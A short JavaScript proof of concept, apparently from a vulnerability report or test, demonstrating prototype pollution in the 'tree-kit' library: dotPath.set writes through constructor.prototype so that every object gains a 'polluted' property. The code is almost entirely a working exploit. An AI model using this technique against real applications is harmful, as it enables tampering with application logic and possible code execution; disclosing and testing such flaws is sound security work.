var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const {dotPath} = require('tree-kit');
obj = {};
console.log({}.polluted);
dotPath.set(obj, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);